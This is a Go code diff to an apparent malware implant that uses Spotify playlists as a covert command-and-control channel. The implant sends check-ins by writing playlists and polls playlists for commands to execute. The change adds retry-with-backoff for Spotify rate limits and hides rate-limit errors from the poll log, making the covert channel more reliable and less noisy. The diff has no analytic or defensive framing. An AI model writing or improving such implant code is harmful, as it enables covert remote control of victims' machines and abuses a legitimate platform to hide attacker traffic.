@@ -85,11 +85,30 @@ func (imp *Implant) sendCheckin() {
 		return
 	}
 
-	if err := imp.client.WriteC2Playlists(ctx, chunks); err != nil {
+	for attempt := 1; attempt <= 3; attempt++ {
+		err = imp.client.WriteC2Playlists(ctx, chunks)
+		if err == nil {
+			fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+			return
+		}
+		if isRateLimit(err) {
+			wait := time.Duration(attempt*10) * time.Second
+			fmt.Printf("[*] Rate limited, retrying in %s...\n", wait)
+			time.Sleep(wait)
+			continue
+		}
 		fmt.Printf("[!] Checkin send failed: %v\n", err)
 		return
 	}
-	fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+}
+
+// isRateLimit checks if an error is a Spotify rate limit.
+func isRateLimit(err error) bool {
+	if err == nil {
+		return false
+	}
+	s := strings.ToLower(err.Error())
+	return strings.Contains(s, "rate") || strings.Contains(s, "429") || strings.Contains(s, "too many")
 }
 
 // Run starts the main polling loop.
@@ -113,7 +132,9 @@ func (imp *Implant) pollAndExecute() {
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
 	if err != nil {
-		fmt.Printf("[!] Poll error: %v\n", err)
+		if !isRateLimit(err) {
+			fmt.Printf("[!] Poll error: %v\n", err)
+		}
 		return
 	}
 
